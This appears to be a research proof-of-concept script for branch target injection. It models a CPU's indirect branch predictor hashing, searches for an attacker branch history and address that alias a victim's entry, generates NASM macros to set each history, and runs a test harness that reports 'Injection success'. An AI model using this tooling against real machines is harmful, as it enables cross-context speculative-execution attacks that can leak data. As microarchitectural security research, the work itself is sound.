import sys
import subprocess
import pandas as pd
import re

victim_phr = [0] * 388
attacker_phr = [0] * 388
print("Input the victim PHR bits you want to flip (0~387), separated by commas:")
input_positions = input().strip().split(',')


for pos in input_positions:
    try:
        bit_position = int(pos.strip())
        if 0 <= bit_position < 388:
            victim_phr[bit_position] = 1 if victim_phr[bit_position] == 0 else 0
            # print(f"Bit at position {bit_position} has been flipped.")
        else:
            print(f"Invalid position {bit_position}. Please input a number between 0 and 387.")
            sys.exit()
    except ValueError:
        print(f"Invalid input '{pos}'. Please input valid numbers separated by commas.")
        sys.exit()

# print(victim_phr)


def xor_fold(array, interval):
    result = array[:interval]
    for i in range(interval, len(array), interval):
        for j in range(interval):
            if i + j < len(array):
                result[j] ^= array[i + j]
    return result


def left_rotate(bits, n):
    return bits[-n:] + bits[:-n]


def get_ibp_index(phr_value):
    even_bits = [phr_value[i] for i in range(0, len(phr_value), 2)]
    even_bits_index = [0, 0, 0] + even_bits[8:]
    even_folded_bits_index = xor_fold(even_bits_index, 9)

    odd_bits = [phr_value[i] for i in range(1, len(phr_value), 2)]
    odd_bits_index = [0, 0, 0] + odd_bits[8:]
    odd_folded_bits_index = xor_fold(odd_bits_index, 9)

    # print("Index - Folded even bits:")
    # print(even_folded_bits_index)

    rotated_odd_folded_bits_index = left_rotate(odd_folded_bits_index, 5)
    # print("Index - Left-rotated folded odd bits:")
    # print(rotated_odd_folded_bits_index)

    ibp_index = [a ^ b for a, b in zip(even_folded_bits_index, rotated_odd_folded_bits_index)]
    # print("IBP Index:")
    # print(ibp_index)
    return ibp_index


victim_ibp_index = get_ibp_index(victim_phr)
for index, value in enumerate(victim_ibp_index):
    if value == 1:
        attacker_phr[(14 + index) * 2] = 1


victim_pc15to6_list = [] * 10
print("Input the victim PC[15:6] in binary: ")
binary_input = input().strip()


if len(binary_input) == 10 and all(bit in '01' for bit in binary_input):
    victim_pc15to6_list = [int(bit) for bit in reversed(binary_input)]
    # print("The binary number has been split and stored in victim_pc15to6:")
    # print(victim_pc15to6_list)
else:
    print("Invalid input. Please enter a valid 10-bit binary number.")
    sys.exit()


def get_ibp_tag(phr_value, pc_15to6):
    pc_15to0 = [0]*6 + pc_15to6
    even_bits = [phr_value[i] for i in range(0, len(phr_value), 2)]
    even_bits_tag = [0] + even_bits[8:]
    even_folded_bits_tag = xor_fold(even_bits_tag, 11)

    odd_bits = [phr_value[i] for i in range(1, len(phr_value), 2)]
    odd_bits_tag = [0] + odd_bits[8:]
    odd_folded_bits_tag = xor_fold(odd_bits_tag, 11)

    # print("Tag - Folded even bits:")
    # print(even_folded_bits_tag)

    rotated_odd_folded_bits_tag = left_rotate(odd_folded_bits_tag, 6)
    # print("Tag - Left-rotated folded odd bits:")
    # print(rotated_odd_folded_bits_tag)

    ibp_tag = [a ^ b for a, b in zip(even_folded_bits_tag, rotated_odd_folded_bits_tag)]
    
    ibp_tag[9] = ibp_tag[9] ^ phr_value[1] ^ phr_value[10] ^ pc_15to0[7]
    ibp_tag[8] = ibp_tag[8] ^ phr_value[9]                 ^ pc_15to0[15]
    ibp_tag[7] = ibp_tag[7] ^ phr_value[7]                 ^ pc_15to0[13]
    ibp_tag[6] = ibp_tag[6] ^ phr_value[5] ^ phr_value[14] ^ pc_15to0[11]
    ibp_tag[5] = ibp_tag[5] ^ phr_value[3] ^ phr_value[12] ^ pc_15to0[9]
    ibp_tag[4] = ibp_tag[4] ^ phr_value[13] ^ phr_value[2] ^ pc_15to0[8]
    ibp_tag[3] = ibp_tag[3] ^ phr_value[11] ^ phr_value[0] ^ pc_15to0[6]
    ibp_tag[2] = ibp_tag[2]                 ^ phr_value[8] ^ pc_15to0[14]
    ibp_tag[1] = ibp_tag[1]                 ^ phr_value[6] ^ pc_15to0[12]
    ibp_tag[0] = ibp_tag[0] ^ phr_value[15] ^ phr_value[4] ^ pc_15to0[10]
    
    # print("IBP tag:")
    # print(ibp_tag)
    return ibp_tag


def search_tag_alaising(attacker_phr, victim_phr, victim_pc15to6_list):
    victim_ibp_tag = get_ibp_tag(victim_phr, victim_pc15to6_list)
    for i in range(2):
        attacker_phr_temp = attacker_phr
        if (i == 1):
            attacker_phr_temp[34] = attacker_phr[34] ^ 1
            attacker_phr_temp[52] = attacker_phr[52] ^ 1
        for attacker_pc15to6 in range(1024):
            binary_str = format(attacker_pc15to6, '010b')
            attacker_pc15to6_temp = [] * 10
            attacker_pc15to6_temp = [int(bit) for bit in reversed(binary_str)]
            attacker_ibp_tag_temp = get_ibp_tag(attacker_phr_temp, attacker_pc15to6_temp)
            if attacker_ibp_tag_temp == victim_ibp_tag:
                return attacker_phr_temp, attacker_pc15to6_temp
    return -1


if (search_tag_alaising(attacker_phr, victim_phr, victim_pc15to6_list) == -1):
    print("No aliasing found.")
else:
    attacker_phr_final, attacker_pc15to6_list = search_tag_alaising(attacker_phr, victim_phr, victim_pc15to6_list)
    attacker_phr_set_position = [index for index, value in enumerate(attacker_phr_final) if value == 1]
    print(f"\nAttacker PHR bits can be set at position: ", end="")
    print(", ".join(map(str, attacker_phr_set_position)))
    print("Attacker PC[15:6] can be: ", end="")
    for i in reversed(attacker_pc15to6_list):
        print(i, end="")
    print("")


def get_phr_doublet(phr_value):
    phr_value_doublet = []
    for i in range(0, len(phr_value), 2):
        doublet = phr_value[i] + phr_value[i+1] * 2
        phr_value_doublet.append(doublet)
    return phr_value_doublet


def create_set_PHR(person, phr_doublet):
    for i in range(len(phr_doublet) - 1, -1, -1):
        if phr_doublet[i] != 0:
            break
    BRANCH_NUM = i+1
    phr_mode="PHR"
    filename = f"SET_{person.upper()}_{phr_mode}.nasm"

    with open(filename, 'w') as file:
        file.write(f"%macro SET_{person.upper()}_{phr_mode} 1\n\n")
        file.write(f"\tjmp {person}_{phr_mode}_doublet{BRANCH_NUM-1}_%+ %1\n")
        for i in range(BRANCH_NUM-1, -1, -1):
            file.write(f"\talign 1<<16\n")
            file.write(f"\t%rep {16 + (3 - phr_doublet[i])}\n")
            file.write(f"\t nop\n")
            file.write(f"\t%endrep\n")
            file.write(f"\t{person}_{phr_mode}_doublet{i}_%+ %1:\n")
            
            if (i > 0):
                if phr_doublet[i] == 3:
                    file.write(f"\t%rep 8\n")
                    file.write(f"\t nop\n")
                    file.write(f"\t%endrep\n")
                else:
                    file.write(f"\talign 1<<3\n")
                
                # if (i == 1) and (phr_mode == "PHR0"):
                #     if (person == "victim"):
                #         file.write(f"\tjmp {person}_set_PHR1_end\n\n")
                #     else:
                #         file.write(f"\tjmp {person}_set_PHR1_end_%+ i\n\n")
                # else:
                file.write(f"\tjmp {person}_{phr_mode}_doublet{i-1}_%+ %1\n\n")
        
        file.write(f"%endmacro")


victim_phr_doublet = get_phr_doublet(victim_phr)
attacker_phr_doublet = get_phr_doublet(attacker_phr_final) 
create_set_PHR("victim", victim_phr_doublet)
create_set_PHR("attacker", attacker_phr_doublet)

def bin_list_to_dec(bin_list):
    dec = 0
    for i in range(len(bin_list)):
        dec = dec + bin_list[i] * (2 ** i)
    return dec

victim_pc15to6_dec = bin_list_to_dec(victim_pc15to6_list)
attacker_pc15to6_dec = bin_list_to_dec(attacker_pc15to6_list)
# print(victim_pc15to6_dec, attacker_pc15to6_dec)

def parse_results(file_path):
    with open(file_path, 'r') as file:
        data = file.read()

    repeat1_match = re.search(r'@   repeat1:\s*(\d+)', data)
    repeat1 = int(repeat1_match.group(1)) if repeat1_match else None

    header_line = re.search(r'@@(.+)', data).group(1)
    headers = re.split(r'\s+', header_line.strip())
    
    results_start = data.find("Custom PMCounter results:")
    results_data = data[results_start:].split('\n')[1:]
    
    results = []
    for line in results_data:
        if line.strip():
            results.append(re.split(r'\s+', line.strip()))
    
    df = pd.DataFrame(results, columns=headers)
    
    return df, repeat1


print("Running injection test...")
script_name = './run.sh'
command = f"{script_name} mode=run victim_pc15to6={victim_pc15to6_dec} attacker_pc15to6={attacker_pc15to6_dec}"

try:
    subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
except subprocess.CalledProcessError as e:
    print(f"Error running script: {e.stderr}")
    sys.exit()
file_path = 'results.out'
df, repeat1 = parse_results(file_path)

df['L2_Miss'] = df['L2_Miss'].astype(int)
df['Cache_Miss'] = (df['L2_Miss'] / repeat1) * 100
cache_hit_rate = 100 - df['Cache_Miss'].mean()
print(f"\nParsing results:")
print(f"Cache Hit Rate: {cache_hit_rate:.2f}%")
if cache_hit_rate > 2:
    print("Injection success!")
else:
    print("Injection fail.")